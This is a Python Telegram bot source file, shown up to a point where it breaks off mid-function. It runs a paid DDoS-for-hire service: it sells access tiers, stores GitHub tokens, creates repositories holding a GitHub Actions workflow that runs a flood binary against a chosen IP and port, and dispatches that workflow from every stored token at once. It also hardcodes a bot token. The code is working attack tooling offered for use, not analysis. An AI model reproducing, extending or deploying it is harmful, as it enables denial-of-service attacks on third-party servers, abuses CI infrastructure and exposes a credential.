import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [8101867786]
OWNER_IDS = [8101867786]

WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_OWNER_ADD = 3
WAITING_FOR_OWNER_DELETE = 4
WAITING_FOR_RESELLER_ADD = 5
WAITING_FOR_RESELLER_REMOVE = 6
WAITING_FOR_TARGET = 7
WAITING_FOR_PORT = 8
WAITING_FOR_TIME = 9
WAITING_FOR_ADD_USER = 10
WAITING_FOR_REMOVE_USER = 11
WAITING_FOR_REDEEM_KEY = 12

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
attack_data = {}

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 1)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return is_owner(user_id) or str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved(user_id):
    return str(user_id) in approved_users

def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Attack", callback_data="launch_attack"),
         InlineKeyboardButton("📊 Check Status", callback_data="check_status")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack"),
         InlineKeyboardButton("💳 My Access", callback_data="my_access")],
        [InlineKeyboardButton("👥 User Management", callback_data="user_management"),
         InlineKeyboardButton("⚙️ Bot Settings", callback_data="bot_settings")],
        [InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel"),
         InlineKeyboardButton("🎫 Token Management", callback_data="token_management")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="add_user"),
         InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
        [InlineKeyboardButton("📋 Users List", callback_data="users_list"),
         InlineKeyboardButton("✅ Approved List", callback_data="approved_list")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_bot_settings_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔧 Maintenance", callback_data="maintenance_toggle"),
         InlineKeyboardButton("⏱️ Set Cooldown", callback_data="set_cooldown")],
        [InlineKeyboardButton("🎯 Max Attacks", callback_data="set_max_attacks"),
         InlineKeyboardButton("💰 Price List", callback_data="price_list")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_owner_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("👑 Add Owner", callback_data="add_owner"),
         InlineKeyboardButton("❌ Delete Owner", callback_data="delete_owner")],
        [InlineKeyboardButton("💼 Add Reseller", callback_data="add_reseller"),
         InlineKeyboardButton("🗑️ Remove Reseller", callback_data="remove_reseller")],
        [InlineKeyboardButton("📋 Owner List", callback_data="owner_list"),
         InlineKeyboardButton("💼 Reseller List", callback_data="reseller_list")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_token_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Token", callback_data="add_token"),
         InlineKeyboardButton("➖ Remove Token", callback_data="remove_token")],
        [InlineKeyboardButton("📋 Tokens List", callback_data="tokens_list"),
         InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_repository(token, repo_name):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            logger.info(f"Repository {repo_name} already exists for user {user.login}.")
            return repo, False
        except Exception:
            repo = user.create_repo(repo_name, description="DDoS Bot Attack Repository", private=False, auto_init=True)
            logger.info(f"Created repository {repo_name} for user {user.login}.")
            time.sleep(2)
            yml_content = """name: BGM ATTACK
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Target IP'
        required: true
      port:
        description: 'Port'
        required: true
      time:
        description: 'Time (seconds)'
        required: true
jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run Attack
        run: |
          chmod +x soul
          ./soul ${{ github.event.inputs.target }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }}
"""
            try:
                repo.create_file(YML_FILE_PATH, "Create workflow file", yml_content, branch="main")
                logger.info(f"Created workflow file in {repo_name}.")
            except Exception as e:
                logger.error(f"Error creating workflow file: {e}")
            return repo, True
    except Exception as e:
        logger.error(f"Error in create_repository: {e}")
        raise

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    chat_id = update.effective_chat.id
    
    if update.effective_chat.type != 'private':
        groups[str(chat_id)] = {
            "group_name": update.effective_chat.title,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_groups(groups)
    
    welcome_message = f"""╔═══════════════════════╗
║  🔥 SERVER FREEZE BOT  🔥  ║
╚═══════════════════════╝

👤 User: @{username}
🆔 ID: {user_id}

⚡ Method: BGM FLOOD
⏱️ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}

Use buttons to continue..."""
    
    keyboard = get_main_keyboard()
    
    if update.message:
        await update.message.reply_text(welcome_message, reply_markup=keyboard)
    else:
        await update.callback_query.message.reply_text(welcome_message, reply_markup=keyboard)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "back_main":
        await start(update, context)
        return
    
    if query.data == "launch_attack":
        if MAINTENANCE_MODE:
            await query.message.reply_text("🔧 BOT IS UNDER MAINTENANCE\nPlease try again later.")
            return
        
        if not is_owner(user_id) and not is_admin(user_id) and not is_approved(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED\nYou don't have permission to launch attacks.")
            return
        
        if current_attack:
            await query.message.reply_text("⚠️ ATTACK IN PROGRESS\nPlease wait for current attack to finish.")
            return
        
        await query.message.reply_text("🎯 LAUNCH ATTACK\nPlease enter target IP:")
        context.user_data['waiting_for'] = 'target'
        return
    
    elif query.data == "check_status":
        global cooldown_until
        if current_attack:
            elapsed = int(time.time() - current_attack['start_time'])
            remaining = current_attack['duration'] - elapsed
            status_message = f"""📊 ATTACK STATUS
            
🎯 Target: {current_attack['target']}
🔌 Port: {current_attack['port']}
⏱️ Duration: {current_attack['duration']}s
⏳ Elapsed: {elapsed}s
⏰ Remaining: {max(0, remaining)}s
👤 User: {current_attack['username']}
🚀 Method: BGM FLOOD
📈 Status: RUNNING"""
        else:
            now = time.time()
            if now < cooldown_until:
                cooldown_left = int(cooldown_until - now)
                status_message = f"⏳ COOLDOWN ACTIVE\nNext attack available in: {cooldown_left}s"
            else:
                status_message = "✅ READY TO ATTACK\nNo attack in progress"
        
        await query.message.reply_text(status_message, reply_markup=get_main_keyboard())
        return
    
    elif query.data == "stop_attack":
        global current_attack
        if not current_attack:
            await query.message.reply_text("❌ NO ATTACK RUNNING\nThere is no active attack to stop.", reply_markup=get_main_keyboard())
            return
        
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED\nOnly owners/admins can stop attacks.", reply_markup=get_main_keyboard())
            return
        
        with attack_lock:
            stopped_attack = current_attack.copy()
            current_attack = None
            save_attack_state()
        
        await query.message.reply_text(f"🛑 ATTACK STOPPED\nTarget: {stopped_attack['target']}\nPort: {stopped_attack['port']}", reply_markup=get_main_keyboard())
        return
    
    elif query.data == "my_access":
        user_id_str = str(user_id)
        access_info = "💳 YOUR ACCESS INFORMATION\n\n"
        
        if is_owner(user_id):
            owner_data = owners[user_id_str]
            access_info += f"👑 Role: OWNER\n"
            access_info += f"📅 Added: {owner_data.get('added_date', 'N/A')}\n"
            access_info += f"✨ Primary: {'Yes' if owner_data.get('is_primary') else 'No'}\n"
        elif is_admin(user_id):
            admin_data = admins[user_id_str]
            access_info += f"👨‍💼 Role: ADMIN\n"
            access_info += f"📅 Added: {admin_data.get('added_date', 'N/A')}\n"
        elif is_reseller(user_id):
            reseller_data = resellers[user_id_str]
            access_info += f"💼 Role: RESELLER\n"
            access_info += f"📅 Added: {reseller_data.get('added_date', 'N/A')}\n"
        elif is_approved(user_id):
            user_data = approved_users[user_id_str]
            access_info += f"✅ Role: APPROVED USER\n"
            access_info += f"📅 Added: {user_data.get('added_date', 'N/A')}\n"
            access_info += f"⏰ Expires: {user_data.get('expiry_date', 'N/A')}\n"
            
            try:
                expiry = datetime.strptime(user_data.get('expiry_date'), "%Y-%m-%d %H:%M:%S")
                now = datetime.now()
                days_left = (expiry - now).days
                access_info += f"📊 Days Left: {days_left}\n"
            except:
                pass
        else:
            access_info += "❌ Role: UNAUTHORIZED\n"
            access_info += "Please contact admin for access.\n"
        
        await query.message.reply_text(access_info, reply_markup=get_main_keyboard())
        return
    
    elif query.data == "user_management":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED\nOnly owners/admins can manage users.", reply_markup=get_main_keyboard())
            return
        
        keyboard = get_user_management_keyboard()
        await query.message.reply_text("👥 USER MANAGEMENT\nSelect an option:", reply_markup=keyboard)
        return
    
    elif query.data == "add_user":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /add <user_id> <days>", reply_markup=get_user_management_keyboard())
        return
    
    elif query.data == "remove_user":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /remove <user_id>", reply_markup=get_user_management_keyboard())
        return
    
    elif query.data == "users_list":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        
        if not approved_users:
            await query.message.reply_text("📭 NO USERS\nNo approved users found.", reply_markup=get_user_management_keyboard())
            return
        
        users_list = "👥 APPROVED USERS LIST\n\n"
        for uid, data in approved_users.items():
            users_list += f"🆔 {uid}\n"
            users_list += f"👤 {data.get('username', 'N/A')}\n"
            users_list += f"⏰ Expires: {data.get('expiry_date', 'N/A')}\n\n"
        users_list += f"📊 Total: {len(approved_users)}"
        
        await query.message.reply_text(users_list, reply_markup=get_user_management_keyboard())
        return
    
    elif query.data == "approved_list":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        
        if not approved_users:
            await query.message.reply_text("📭 NO APPROVED USERS", reply_markup=get_user_management_keyboard())
            return
        
        approved_list = "✅ APPROVED USERS\n\n"
        for uid, data in approved_users.items():
            approved_list += f"🆔 {uid} - {data.get('username', 'N/A')}\n"
        
        await query.message.reply_text(approved_list, reply_markup=get_user_management_keyboard())
        return
    
    elif query.data == "bot_settings":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can access bot settings.", reply_markup=get_main_keyboard())
            return
        
        keyboard = get_bot_settings_keyboard()
        await query.message.reply_text("⚙️ BOT SETTINGS\nSelect an option:", reply_markup=keyboard)
        return
    
    elif query.data == "maintenance_toggle":
        global MAINTENANCE_MODE
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        save_maintenance_mode(MAINTENANCE_MODE)
        status = "ENABLED" if MAINTENANCE_MODE else "DISABLED"
        await query.message.reply_text(f"🔧 MAINTENANCE MODE {status}", reply_markup=get_bot_settings_keyboard())
        return
    
    elif query.data == "set_cooldown":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /setcooldown <seconds>", reply_markup=get_bot_settings_keyboard())
        return
    
    elif query.data == "set_max_attacks":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /setmaxattack <number>", reply_markup=get_bot_settings_keyboard())
        return
    
    elif query.data == "price_list":
        price_msg = "💰 PRICE LIST\n\n"
        price_msg += "👤 USER PRICES:\n"
        for days, price in USER_PRICES.items():
            price_msg += f"• {days} day(s): ₹{price}\n"
        price_msg += "\n💼 RESELLER PRICES:\n"
        for days, price in RESELLER_PRICES.items():
            price_msg += f"• {days} day(s): ₹{price}\n"
        
        await query.message.reply_text(price_msg, reply_markup=get_bot_settings_keyboard())
        return
    
    elif query.data == "owner_panel":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can access owner panel.", reply_markup=get_main_keyboard())
            return
        
        keyboard = get_owner_panel_keyboard()
        await query.message.reply_text("👑 OWNER PANEL\nSelect an option:", reply_markup=keyboard)
        return
    
    elif query.data == "add_owner":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /addowner <user_id>", reply_markup=get_owner_panel_keyboard())
        return
    
    elif query.data == "delete_owner":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /deleteowner <user_id>", reply_markup=get_owner_panel_keyboard())
        return
    
    elif query.data == "add_reseller":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /addreseller <user_id>", reply_markup=get_owner_panel_keyboard())
        return
    
    elif query.data == "remove_reseller":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /removereseller <user_id>", reply_markup=get_owner_panel_keyboard())
        return
    
    elif query.data == "owner_list":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        
        owner_msg = "👑 OWNERS LIST\n\n"
        for uid, data in owners.items():
            owner_msg += f"🆔 {uid}\n"
            owner_msg += f"👤 {data.get('username', 'N/A')}\n"
            owner_msg += f"✨ Primary: {'Yes' if data.get('is_primary') else 'No'}\n\n"
        owner_msg += f"📊 Total: {len(owners)}"
        
        await query.message.reply_text(owner_msg, reply_markup=get_owner_panel_keyboard())
        return
    
    elif query.data == "reseller_list":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        
        if not resellers:
            await query.message.reply_text("📭 NO RESELLERS", reply_markup=get_owner_panel_keyboard())
            return
        
        reseller_msg = "💼 RESELLERS LIST\n\n"
        for uid, data in resellers.items():
            reseller_msg += f"🆔 {uid} - {data.get('username', 'N/A')}\n"
        reseller_msg += f"\n📊 Total: {len(resellers)}"
        
        await query.message.reply_text(reseller_msg, reply_markup=get_owner_panel_keyboard())
        return
    
    elif query.data == "token_management":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED\nOnly owners can manage tokens.", reply_markup=get_main_keyboard())
            return
        
        keyboard = get_token_management_keyboard()
        await query.message.reply_text("🎫 TOKEN MANAGEMENT\nSelect an option:", reply_markup=keyboard)
        return
    
    elif query.data == "add_token":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /addtoken <github_token>", reply_markup=get_token_management_keyboard())
        return
    
    elif query.data == "remove_token":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /removetoken <number>", reply_markup=get_token_management_keyboard())
        return
    
    elif query.data == "tokens_list":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        
        if not github_tokens:
            await query.message.reply_text("📭 NO TOKENS\nNo GitHub tokens added yet.", reply_markup=get_token_management_keyboard())
            return
        
        tokens_list = "🔑 SERVERS LIST:\n\n"
        for i, token_data in enumerate(github_tokens, 1):
            tokens_list += f"{i}. 👤 {token_data['username']}\n   📁 {token_data['repo']}\n\n"
        tokens_list += f"📊 Total servers: {len(github_tokens)}"
        
        await query.message.reply_text(tokens_list, reply_markup=get_token_management_keyboard())
        return
    
    elif query.data == "upload_binary":
        if not is_owner(user_id):
            await query.message.reply_text("⚠️ ACCESS DENIED", reply_markup=get_main_keyboard())
            return
        await query.message.reply_text("Please use command: /binary_upload", reply_markup=get_token_management_keyboard())
        return
    
    elif query.data == "help":
        help_text = """📖 HELP & COMMANDS

🚀 ATTACK COMMANDS:
• Launch Attack - Start BGM flood attack
• Check Status - View current attack status
• Stop Attack - Stop running attack

💳 USER COMMANDS:
• My Access - Check your access info
• /redeem <key> - Redeem access key
• /myaccess - View access details

👥 ADMIN COMMANDS:
• /add <id> <days> - Add user
• /remove <id> - Remove user
• /userslist - View all users

👑 OWNER COMMANDS:
• /addowner <id> - Add owner
• /deleteowner <id> - Remove owner
• /addreseller <id> - Add reseller
• /removereseller <id> - Remove reseller
• /addtoken <token> - Add GitHub token
• /removetoken <num> - Remove token
• /binary_upload - Upload binary file

⚙️ SETTINGS:
• /maintenance - Toggle maintenance mode
• /setcooldown <sec> - Set cooldown time
• /setmaxattack <num> - Set max attacks

Use the buttons for easier access!"""
        
        await query.message.reply_text(help_text, reply_markup=get_main_keyboard())
        return

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if 'waiting_for' not in context.user_data:
        return
    
    waiting_for = context.user_data['waiting_for']
    
    if waiting_for == 'target':
        context.user_data['target'] = text
        context.user_data['waiting_for'] = 'port'
        await update.message.reply_text("🔌 Enter port number:")
        return
    
    elif waiting_for == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535:
                await update.message.reply_text("❌ Invalid port. Enter port (1-65535):")
                return
            context.user_data['port'] = port
            context.user_data['waiting_for'] = 'time'
            await update.message.reply_text("⏱️ Enter duration (seconds):")
            return
        except ValueError:
            await update.message.reply_text("❌ Invalid port. Enter a number:")
            return
    
    elif waiting_for == 'time':
        try:
            duration = int(text)
            if duration < 1:
                await update.message.reply_text("❌ Duration must be positive:")
                return
            
            target = context.user_data['target']
            port = context.user_data['port']
            
            global current_attack, cooldown_until
            
            now = time.time()
            if now < cooldown_until:
                cooldown_left = int(cooldown_until - now)
                await update.message.reply_text(f"⏳ COOLDOWN ACTIVE\nWait {cooldown_left}s before next attack.", reply_markup=get_main_keyboard())
                del context.user_data['waiting_for']
                return
            
            if not github_tokens:
                await update.message.reply_text("❌ NO SERVERS\nNo GitHub tokens configured.", reply_markup=get_main_keyboard())
                del context.user_data['waiting_for']
                return
            
            with attack_lock:
                current_attack = {
                    'target': target,
                    'port': port,
                    'duration': duration,
                    'user_id': user_id,
                    'username': update.effective_user.username or str(user_id),
                    'start_time': time.time()
                }
                save_attack_state()
            
            success_count = 0
            fail_count = 0
            
            def trigger_attack(token_data):
                nonlocal success_count, fail_count
                try:
                    g = Github(token_data['token'])
                    repo = g.get_repo(token_data['repo'])
                    workflow = repo.get_workflow("main.yml")
                    workflow.create_dispatch(
                        ref="main",
                        inputs={
                            "target": target,
                            "port": str(port),
                            "time": str(duration)
                        }
                    )
                    success_count += 1
                except Exception as e:
                    fail_count += 1
                    logger.error(f"Attack trigger failed for {token_data['username']}: {e}")
            
            threads = []
            for token_data in github_tokens:
                thread = threading.Thread(target=trigger_attack, args=(token_data,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            cooldown_until = time.time() + COOLDOWN_DURATION
            
            attack_msg = f"""🚀 ATTACK LAUNCHED!

🎯 Target: {target}
🔌 Port: {port}
⏱️ Duration: {duration}s
⚡ Method: BGM FLOOD

📊 RESULTS:
✅ Success: {success_count}
❌ Failed: {fail_count}
📁 Total: {len(github_tokens)}

⏳ Cooldown: {COOLDOWN_DURATION}s"""
            
            await update.message.reply_text(attack_msg, reply_markup=get_main_keyboard())
            
            del context.user_data['waiting_for']
            del context.user_data['target']
            del context.user_data['port']
            
            def clear_attack():
                time.sleep(duration)
                global current_attack
                with attack_lock:
                    current_attack = None
                    save_attack_state()
            
            threading.Thread(target=clear_attack, daemon=True).start()
            
        except ValueError:
            await update.message.reply_text("❌ Invalid duration. Enter a number:")
            return

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """📖 HELP & COMMANDS

🚀 ATTACK COMMANDS:
• Launch Attack - Start BGM flood attack
• Check Status - View current attack status
• Stop Attack - Stop running attack

💳 USER COMMANDS:
• My Access - Check your access info
• /redeem <key> - Redeem access key
• /myaccess - View access details

👥 ADMIN COMMANDS:
• /add <id> <days> - Add user
• /remove <id> - Remove user
• /userslist - View all users

👑 OWNER COMMANDS:
• /addowner <id> - Add owner
• /deleteowner <id> - Remove owner
• /addreseller <id> - Add reseller
• /removereseller <id> - Remove reseller
• /addtoken <token> - Add GitHub token
• /removetoken <num> - Remove token
• /binary_upload - Upload binary file

⚙️ SETTINGS:
• /maintenance - Toggle maintenance mode
• /setcooldown <sec> - Set cooldown time
• /setmaxattack <num> - Set max attacks

Use the buttons for easier access!"""
    
    await update.message.reply_text(help_text, reply_markup=get_main_keyboard())

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "No username"
    await update.message.reply_text(f"🆔 YOUR ID INFORMATION\n\n👤 Username: @{username}\n🔢 User ID: {user_id}")

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_id_str = str(user_id)
    access_info = "💳 YOUR ACCESS INFORMATION\n\n"
    
    if is_owner(user_id):
        owner_data = owners[user_id_str]
        access_info += f"👑 Role: OWNER\n"
        access_info += f"📅 Added: {owner_data.get('added_date', 'N/A')}\n"
        access_info += f"✨ Primary: {'Yes' if owner_data.get('is_primary') else 'No'}\n"
    elif is_admin(user_id):
        admin_data = admins[user_id_str]
        access_info += f"👨‍💼 Role: ADMIN\n"
        access_info += f"📅 Added: {admin_data.get('added_date', 'N/A')}\n"
    elif is_reseller(user_id):
        reseller_data = resellers[user_id_str]
        access_info += f"💼 Role: RESELLER\n"
        access_info += f"📅 Added: {reseller_data.get('added_date', 'N/A')}\n"
    elif is_approved(user_id):
        user_data = approved_users[user_id_str]
        access_info += f"✅ Role: APPROVED USER\n"
        access_info += f"📅 Added: {user_data.get('added_date', 'N/A')}\n"
        access_info += f"⏰ Expires: {user_data.get('expiry_date', 'N/A')}\n"
        
        try:
            expiry = datetime.strptime(user_data.get('expiry_date'), "%Y-%m-%d %H:%M:%S")
            now = datetime.now()
            days_left = (expiry - now).days
            access_info += f"📊 Days Left: {days_left}\n"
        except:
            pass
    else:
        access_info += "❌ Role: UNAUTHORIZED\n"
        access_info += "Please contact admin for access.\n"
    
    await update.message.reply_text(access_info)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or str(user_id)
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /redeem <key>")
        return
    
    key = context.args[0]
    await update.message.reply_text(f"🎫 REDEEM KEY\nKey: {key}\n\nContact admin to activate your key.")

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners/admins can add users.")
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /add <user_id> <days>")
        return
    
    try:
        target_user_id = int(context.args[0])
        days = int(context.args[1])
        
        if days < 1:
            await update.message.reply_text("❌ Days must be positive")
            return
        
        expiry_date = datetime.now() + timedelta(days=days)
        
        approved_users[str(target_user_id)] = {
            "username": f"user_{target_user_id}",
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry_date": expiry_date.strftime("%Y-%m-%d %H:%M:%S"),
            "added_by": str(user_id),
            "days": days
        }
        save_approved_users(approved_users)
        
        await update.message.reply_text(f"✅ USER ADDED\nUser ID: {target_user_id}\nDays: {days}\nExpires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or days")

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED\nOnly owners/admins can remove users.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ INVALID SYNTAX\nUsage: /remove <user_id>")
        return
    
    try:
        target_user_id = str(context.args[0])
        
        if target_user_id not in approved_users:
            await update.message.reply_text("❌ USER NOT FOUND")
            return
        
        del approved_users[target_user_id]
        save_approved_users(approved_users)
        
        await update.message.reply_text(f"✅ USER REMOVED\nUser ID: {target_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def userslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("⚠️ ACCESS DENIED")
        return
    
    if not approved_users:
